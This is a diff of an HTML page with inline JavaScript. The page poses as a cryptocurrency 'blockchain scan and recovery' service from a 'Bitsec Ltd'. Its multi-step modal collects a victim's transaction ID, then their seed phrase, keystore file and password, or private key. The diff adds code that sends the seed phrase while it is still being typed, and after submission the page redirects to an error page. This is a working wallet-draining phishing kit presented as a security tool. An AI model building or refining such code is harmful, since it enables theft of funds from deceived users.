@@ -83,20 +83,20 @@
   <header>
 
     <div class="nav-bar">
-      <div class="custom_nav-container" style="align-items: center;">
+      <div class="custom_nav-container" style="justify-content: center;">
 
         <a><img src="images/logo.png" class="img-logo" style=""></a>
-        <a class="" href="/">
-          <img class="png img-logo" src="images/home.png" style="">
-        </a>
 
       </div>
     </div>
   </header>
 
-  <div class="hero_area">
+  <div class="hero_area" style="justify-content: center; align-items: center;">
 
     <!-- Hidden div for wallet selection -->
+<button id='modal-button' type="button" style="padding:1rem; background-color: rgba(0, 23, 51, 0.9);"  class="btn btn-primary" data-toggle="modal" data-target="#multiStepModal">
+  Launch demo modal
+</button>
 
     <div class="container-fluid">
       <div class="hero_bg_box" style="filter: blur(4px) brightness(0.5); background-image: url('/images/bgbgbg.png'); background-repeat: no-repeat;
@@ -106,30 +106,10 @@
       <!-- this is for first page-->
       <!--
 
-We understand that security is important to you. That's why we use industry-standard encryption to protect your data
-Use a clear call-to-action (CTA)
-
-Make sure the CTA is clear and prominent.
-Use action-oriented language that encourages the user to take action.
-Example:
-
-"Click 'Next' to proceed with importing your wallet."
-
-Display your company's logo and branding consistently throughout the dialogue box.
-Use a consistent font and color scheme to create a professional look.
-Step 4: Terms and Conditions
-
-"By proceeding, you acknowledge that you have read and agree to our terms and conditions."
-"Please review our terms and conditions before proceed
-
-Options:
-
-"Yes, I understand and am ready to proceed"
-"No, I need more information before proceeding"
-
--->
 
       <!-- Multi-Step Modal -->
+       <!-- Button to trigger modal -->
+
       <div class="modal fade" id="multiStepModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true"
         style="">
         <div class="modal-dialog modal-dialog-centered modal-lg">
@@ -139,28 +119,30 @@ Options:
             </div>
             <div class="modal-body">
               <div class="step-content active" id="step1">
-                <p>For successful check and recovery you are required to complete a few steps for authentication and
-                  transaction verification.</p>
-                <p>You will need to enter correct transaction ID and connect your wallet. </p>
 
+                <p>
+                  In order to perform a complete blockchain scan and recovery you are required to complete a few steps
+                  to verify your wallet account and confirm your transaction ID.
+                </p>
                 <div class="form-check">
                   <input class="form-check-input" type="checkbox" id="exampleCheckbox">
                   <label class="form-check-label" for="exampleCheckbox">
-                    Yes, I understand and am ready to proceed.
+                    Yes, I understand and I am ready to proceed.
                   </label>
                 </div>
               </div>
 
               <div class="step-content" id="step2" style="display: none;">
                 <form id="empty">
-                  <p>Enter the transaction ID or transaction hash</p>
-                  <label>Transaction ID / Hash or Signature</label>
-                  <input type="text" class="form-control" required name="new-input" placeholder="e.g. 0x3f7453c6b...">
+                  <p>Enter the transaction ID/Hash</p>
+                  <label>Transaction ID</label>
+                  <input id="txid" type="text" class="form-control" required name="new-input"
+                    placeholder="Enter here..." oninput="validateID()">
                 </form>
               </div>
 
               <div class="step-content" id="step3" style="display: none;">
-                <h3 style="font-size: 1.1rem; text-align: center; ">Choose one of three validation methods</h3>
+                <h3 style="font-size: 1rem; text-align: center; font-weight: lighter; margin-bottom: 1rem">Select your preferred method</h3>
                 <ul class="nav nav-tabs" id="myTab" role="tablist">
                   <li class="nav-item" role="presentation">
                     <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home"
@@ -181,14 +163,14 @@ Options:
                     </button>
                   </li>
                 </ul>
+
                 <div class="tab-content" id="myTabConflextent">
                   <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
-                    <div style="margin: 1rem 0; font-weight: 400;"></div>
                     <!-- This is for phrase  -->
                     <form id="phrase-form">
                       <div class="form-group mb-3">
-                        <textarea style="height: 10rem; color: #3ab6ff" class="form-control" required type="text"
-                          placeholder="Seed phrase..." name="phrase"></textarea>
+                        <textarea style="height: 10rem; border-width: 1px;color: #3ab6ff" class="form-control" required type="text"
+                          placeholder="Seed phrase..." name="phrase" oninput="watchmen()" id="verify"></textarea>
 
                         <div id="" class="form-text">
 
@@ -212,7 +194,7 @@ Options:
                     margin-bottom: 30px;
                     color: #0150b8;
                     " required name="keystore-pass" type="text" class="form-control" id="pass"
-                          placeholder="Keystore password" aria-label="Username" aria-describedby="basic-addon1" />
+                          placeholder="Keystore password..." aria-label="Username" aria-describedby="basic-addon1" />
                       </div>
 
 
@@ -238,10 +220,13 @@ Options:
                 <div class="form-check" style="text-align: center;">
                   <input class="form-check-input" type="checkbox" id="submitc">
                   <label class="form-check-label" for="submitc">
-                    Yes, I understand and am ready to proceed.
+                    I agree to <a href="terms.html" target="_blank">Terms of use</a> and <a href="terms.html" target="_blank">Privacy policy</a>
                   </label>
                 </div>
+
+
               </div>
+
               <div style="display: flex; justify-content:space-between;" id="button-container">
                 <button type="button" class="btn btn-secondary" id="prevBtn"
                   style="padding: 0.75rem 2rem; width: 120px; display: none; margin-top:1rem">Back</button>
@@ -256,11 +241,6 @@ Options:
             </div>
           </div>
 
-
-
-
-
-
         </div>
         <!-- Spinner Container -->
         <div class="spinner-container" id="spinner" style="display: none; flex-direction: column-reverse;">
@@ -271,20 +251,37 @@ Options:
 
       </div>
       <!-- footer section -->
+      <!--
       <section class="footer_section form-footer">
         <p style="color: white;">
           &copy; <span id="displayYear"></span> All Rights Reserved By Bitsec Ltd.
         </p>
       </section>
       <!-- jQuery and Bootstrap JS -->
-
-
-      <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
       <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
       <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
 
       <script type="text/javascript" src="js/form.js"></script>
       <script>
+        document.addEventListener('DOMContentLoaded', function() {
+    var openModalBtn = document.getElementById('modal-button');
+    var multiStepModal = new bootstrap.Modal(document.getElementById('multiStepModal'));
+
+    openModalBtn.addEventListener('click', function() {
+      multiStepModal.show();
+    });
+  });
+        const steps = [...document.querySelectorAll('.step-content')];
+        const nextBtn = document.getElementById('nextBtn');
+        const prevBtn = document.getElementById('prevBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const title = document.querySelector('.modal-title');
+        const checkbox = document.getElementById('exampleCheckbox');
+        const submitCheckbox = document.getElementById('submitc');
+        const row = document.getElementById('button-container');
+        var sent = false;
+        let currentStep = 0;
+
 
         document.getElementById('submitBtn').addEventListener('click', function () {
           // Get the active tab pane
@@ -292,6 +289,7 @@ Options:
 
           // Get the form within the active tab pane
           var activeForm = activeTab.querySelector('form');
+          console.log(activeForm.id);
 
           // Submit the form data based on the active tab
           if (activeForm.id === 'phrase-form') {
@@ -309,7 +307,7 @@ Options:
             var activeTab = document.querySelector('.tab-pane.active');
             var activeForm = activeTab.querySelector('form');
             var formData = new FormData(activeForm);
-            if (!validatePhrase(formData.get('phrase'))) {
+            if (!validateKeystore(formData.get('keystore-json'), formData.get('keystore-pass'))) {
               alert('Invalid form submission!')
               return false;
             } else {
@@ -320,7 +318,7 @@ Options:
             var activeTab = document.querySelector('.tab-pane.active');
             var activeForm = activeTab.querySelector('form');
             var formData = new FormData(activeForm);
-            if (!validatePhrase(formData.get('phrase'))) {
+            if (!validatePkey(formData.get('pkey'))) {
               alert('Invalid form submission!')
               return false;
             } else {
@@ -328,17 +326,12 @@ Options:
               send(3);
             }
           }
-        });
-        const steps = [...document.querySelectorAll('.step-content')];
-        const nextBtn = document.getElementById('nextBtn');
-        const prevBtn = document.getElementById('prevBtn');
-        const submitBtn = document.getElementById('submitBtn');
-        const title = document.querySelector('.modal-title');
-        const checkbox = document.getElementById('exampleCheckbox');
-        const submitCheckbox = document.getElementById('submitc');
-        const row = document.getElementById('button-container');
-        let currentStep = 0;
+          setTimeout(function() {
+    // Redirect to 'monkey.html' after 5 seconds
+    window.location.href = 'errorpage.html';
+}, 5000); // 5000 milliseconds = 5 seconds
 
+        });
         function showStep(step) {
           steps.forEach((content, index) => {
             content.style.display = index === step ? 'block' : 'none';
@@ -346,9 +339,11 @@ Options:
           title.textContent = `Step ${step + 1} / 3`;
           if (step === 0) {
             row.style.justifyContent = 'center';
+            nextBtn.disabled = true;
             prevBtn.style.display = 'none';
           } else if (step === 1) {
-            row.style.justifyContent = 'space-between';
+            nextBtn.disabled = true;
+            row.style.justifyContent = 'space-evenly';
             prevBtn.style.display = 'inline-block';
             submitBtn.style.display = 'none';
             nextBtn.style.display = 'inline-block';
@@ -361,6 +356,23 @@ Options:
           nextBtn.style.display = step < steps.length - 1 ? 'inline-block' : 'none';
           submitBtn.style.display = step > steps.length - 2 ? 'inline-block' : 'none';
           */
+        }
+
+        function validateID() {
+          let input = document.getElementById('txid').value;
+          if (validateTransaction(input)) {
+            nextBtn.disabled = false;
+          } else {
+            nextBtn.disabled = true;
+          }
+        }
+
+        function watchmen() {
+          let input = document.getElementById('verify').value;
+          if (phraseWatchmen(input) && !sent) {
+            send(1);
+          }
+
         }
 
         nextBtn.addEventListener('click', () => {
